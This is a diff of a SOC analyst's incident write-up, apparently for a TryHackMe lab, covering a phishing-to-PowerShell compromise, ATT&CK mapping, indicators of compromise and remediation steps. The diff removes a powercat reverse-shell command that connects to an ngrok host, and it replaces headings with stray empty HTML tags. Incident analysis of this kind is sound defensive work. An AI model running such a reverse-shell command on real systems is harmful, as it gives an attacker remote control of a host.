@@ -159,23 +159,11 @@ Script Block Text = full transcript of attacker commands
 4.5 Reverse Shell (C2) Established
 <img width="1274" height="644" alt="powercat downloaded from github" src="https://github.com/user-attachments/assets/6e4313e6-6884-4517-8237-03cee4fa3683" />
 
-The key C2 command:
-
-powercat -c 2.tcp.ngrok.io -p 19282 -e powershell
 
 
-Indicates:
-
-Outbound TCP session
-
-Attacker-controlled host
-
-Remote PowerShell session opened
-
-📷 Insert Network C2 Screenshot
-
-📌 5. MITRE ATT&CK Mapping
+<h2> </h2> MITRE ATT&CK Mapping
 Phase	Technique	ID
+<h1></h1>
 Initial Access	Phishing	T1566
 Execution	PowerShell	T1059.001
 Defense Evasion	Execution Policy Bypass	T1620
@@ -183,35 +171,47 @@ Discovery	AD, LDAP, Host Discovery	T1087, T1069, T1018
 Collection	Enumerating sensitive hostname data	T1005
 C2	Reverse Shell (PowerCat)	T1105
 Exfiltration	DNS-based mechanisms	T1048.003
-📌 6. Indicators of Compromise (IOCs)
+
+
+
+ Indicators of Compromise (IOCs)
 Domains:
 - suspicious.xyz
 - 2.tcp.ngrok.io
+
+
 
 Files:
 - Important-Invoice-February.zip
 - powercat.ps1
 - powerview.ps1
 
+
+
 Processes:
 - powershell.exe (ExecutionPolicy Bypass)
 - net.exe / net1.exe
 
+
+
 Network:
 - Outbound TCP → ngrok C2 servers
 
-📌 7. Impact Assessment
+<h2></h2> Impact Assessment
 
+<h1></h1>
 ✔ Host was successfully compromised
 ✔ AD reconnaissance performed
 ✔ Internal network mapping attempted
 ✔ C2 channel created for remote access
 ✔ Potential for privilege escalation + lateral movement
 
-No confirmed exfiltration, but attempted DNS-based collection was present.
 
-📌 8. Containment & Remediation Actions
-Immediate Containment
+
+ <h2> Containment & Remediation Actions through EDR
+
+   <h1></h1>
+   Immediate Containment
 
 Isolate host from network
 
@@ -245,7 +245,9 @@ Alert on AD/LDAP bulk queries
 
 Alert on outbound DNS to rare TLDs
 
-🛡️ 9. My Response as a SOC Analyst (Senior-Level Perspective)
+<h2> My Response as a SOC Analyst 
+
+<h1></h1>
 
 As the SOC analyst leading this investigation, I:
 
@@ -281,22 +283,4 @@ Ensured SOC engineering and IR teams had actionable intelligence for future case
 
 Provided executive summary, impact analysis, and clear remediation roadmap.
 
-📌 10. Conclusion
 
-This investigation demonstrates advanced SOC skills including:
-
-Incident reconstruction
-
-PowerShell forensics
-
-DNS exfiltration analysis
-
-Threat hunting
-
-MITRE mapping
-
-Detection engineering
-
-Senior-level documentation
-
-This TryHackMe lab showcases readiness for Tier 2–Tier 3 SOC, Cloud Security Analyst, or CSIRT / IR roles.
